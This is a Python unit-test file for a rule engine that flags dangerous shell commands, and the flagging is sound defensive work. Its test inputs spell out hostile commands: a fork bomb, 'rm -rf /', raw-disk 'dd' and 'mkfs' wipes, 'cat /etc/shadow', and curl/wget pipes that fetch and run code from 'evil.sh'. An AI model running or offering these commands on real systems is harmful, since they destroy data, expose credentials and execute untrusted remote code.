"""
Unit tests for the Rule Engine
Tests cover Tier 0 (CRITICAL instant catches) and Tier 1 (scored patterns).
All tests run synchronously against the PatternMatcher directly — no daemon needed.
"""

import pytest
from engine.models import RiskLevel, CommandContext
from engine.parser.command_parser import CommandParser
from engine.rule_engine.pattern_matcher import PatternMatcher
from tests.conftest import make_context

import toml
from pathlib import Path

# ── Load real patterns from TOML ──────────────────────────────────────────────
_RULES_PATH = Path(__file__).parent.parent.parent / "rules" / "dangerous_patterns.toml"
_PATTERNS = toml.load(_RULES_PATH).get("patterns", [])

parser = CommandParser()


def _matcher() -> PatternMatcher:
    return PatternMatcher(_PATTERNS)


def _parse(cmd: str):
    return parser.parse(cmd, cwd="/home/user", user="testuser")


# ═══════════════════════════════════════════════════════════════════════════════
# Tier 0: CRITICAL — These must ALWAYS fire with confidence=1.0
# ═══════════════════════════════════════════════════════════════════════════════

class TestTier0Critical:

    def test_fork_bomb_classic(self):
        parsed = _parse(":(){ :|:& };:")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "Fork bomb not detected!"
        assert v.risk_level == RiskLevel.CRITICAL
        assert v.confidence == 1.0
        assert v.matched_pattern == "fork_bomb"

    def test_fork_bomb_variant(self):
        parsed = _parse(":(){ :|:& };: &")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "Fork bomb variant not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_rm_rf_root_slash(self):
        parsed = _parse("rm -rf /")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "rm -rf / not detected!"
        assert v.risk_level == RiskLevel.CRITICAL
        assert v.confidence == 1.0

    def test_rm_rf_root_glob(self):
        parsed = _parse("rm -rf /*")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "rm -rf /* not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_sudo_rm_rf_root(self):
        parsed = _parse("sudo rm -rf /")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "sudo rm -rf / not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_dd_raw_device_sda(self):
        parsed = _parse("dd if=/dev/zero of=/dev/sda bs=1M")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "dd to /dev/sda not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_dd_raw_device_nvme(self):
        parsed = _parse("dd if=/dev/urandom of=/dev/nvme0n1 bs=4096")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "dd to /dev/nvme0n1 not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_mkfs_device(self):
        parsed = _parse("mkfs.ext4 /dev/sda1")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "mkfs.ext4 /dev/sda1 not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_curl_pipe_sh(self):
        parsed = _parse("curl http://evil.sh | sh")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "curl|sh not detected!"
        assert v.risk_level == RiskLevel.CRITICAL

    def test_wget_pipe_bash(self):
        parsed = _parse("wget -qO- http://evil.sh | bash")
        v = _matcher().check_tier0(parsed)
        assert v is not None, "wget|bash not detected!"
        assert v.risk_level == RiskLevel.CRITICAL


# ═══════════════════════════════════════════════════════════════════════════════
# Tier 1: Pattern library scored matches
# ═══════════════════════════════════════════════════════════════════════════════

class TestTier1Patterns:

    def test_rm_rf_var_log(self):
        parsed = _parse("sudo rm -rf /var/log/*")
        ctx = make_context("sudo rm -rf /var/log/*")
        m = _matcher().match(parsed, ctx)
        assert m is not None, "rm -rf /var/log/* not detected!"
        assert m.risk_level == RiskLevel.HIGH
        assert m.confidence >= 0.55

    def test_chmod_777_system(self):
        parsed = _parse("chmod -R 777 /etc")
        ctx = make_context("chmod -R 777 /etc")
        m = _matcher().match(parsed, ctx)
        assert m is not None, "chmod -R 777 /etc not detected!"
        assert m.risk_level == RiskLevel.HIGH

    def test_rm_boot(self):
        parsed = _parse("rm -rf /boot")
        ctx = make_context("rm -rf /boot")
        m = _matcher().match(parsed, ctx)
        assert m is not None, "rm -rf /boot not detected!"
        assert m.risk_level == RiskLevel.CRITICAL

    def test_cat_shadow(self):
        parsed = _parse("cat /etc/shadow")
        ctx = make_context("cat /etc/shadow")
        m = _matcher().match(parsed, ctx)
        assert m is not None, "cat /etc/shadow not detected!"
        assert m.risk_level == RiskLevel.MEDIUM

    def test_sudo_boosts_confidence(self):
        """Same command with sudo should have higher confidence."""
        parsed_no_sudo = _parse("rm -rf /var/log/syslog")
        ctx_no_sudo = make_context("rm -rf /var/log/syslog")

        parsed_sudo = _parse("sudo rm -rf /var/log/syslog")
        ctx_sudo = make_context("sudo rm -rf /var/log/syslog")

        m1 = _matcher().match(parsed_no_sudo, ctx_no_sudo)
        m2 = _matcher().match(parsed_sudo, ctx_sudo)
        # Both should match the same pattern; sudo version should have higher confidence
        if m1 is not None and m2 is not None:
            assert m2.confidence >= m1.confidence

    def test_dry_run_reduces_confidence(self):
        """--dry-run flag should lower confidence."""
        parsed = _parse("rm --dry-run -rf /var/log/*")
        ctx = make_context("rm --dry-run -rf /var/log/*")
        m = _matcher().match(parsed, ctx)
        if m is not None:
            assert m.confidence < 0.80, "Dry-run should reduce confidence"


# ═══════════════════════════════════════════════════════════════════════════════
# No False Positives: Safe commands must NOT be flagged
# ═══════════════════════════════════════════════════════════════════════════════

class TestNoFalsePositives:

    SAFE_COMMANDS = [
        "ls -la /home/user",
        "grep -r 'error' /var/log/syslog",
        "cat /etc/hostname",
        "df -h",
        "ps aux",
        "mkdir -p /home/user/projects",
        "cp file.txt /tmp/backup.txt",
        "touch /tmp/test.txt",
        "echo 'hello world'",
        "git status",
        "python3 --version",
        "rm -rf /tmp/my_test_dir",
        "chmod 755 /home/user/script.sh",
        "cd /home/user/Documents",
        "pwd",
        "whoami",
        "date",
        "uname -a",
    ]

    @pytest.mark.parametrize("cmd", SAFE_COMMANDS)
    def test_safe_command_no_tier0(self, cmd):
        """Safe commands must not trigger Tier 0."""
        parsed = _parse(cmd)
        v = _matcher().check_tier0(parsed)
        assert v is None, f"False positive Tier 0 on: {cmd}"

    @pytest.mark.parametrize("cmd", SAFE_COMMANDS)
    def test_safe_command_no_high_confidence_tier1(self, cmd):
        """Safe commands must not be HIGH+ in Tier 1."""
        parsed = _parse(cmd)
        ctx = make_context(cmd)
        m = _matcher().match(parsed, ctx)
        if m is not None:
            assert m.risk_level not in (RiskLevel.HIGH, RiskLevel.CRITICAL), \
                f"False positive Tier 1 ({m.risk_level}) on: {cmd}"
